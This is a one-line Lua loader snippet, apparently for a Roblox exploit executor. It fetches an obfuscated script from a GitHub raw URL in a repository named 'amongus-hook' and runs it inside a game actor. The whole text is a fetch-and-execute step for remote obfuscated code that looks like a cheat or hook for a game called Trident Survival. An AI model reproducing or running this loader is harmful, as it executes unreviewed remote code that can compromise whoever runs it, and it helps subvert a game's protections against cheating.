...
run_on_actor_fix(getactors()[1], request({Url=`https://raw.githubusercontent.com/mainstreamed/amongus-hook/main/tridentsurvival/krampus/obfuscated.lua`,Method='GET'}).Body);
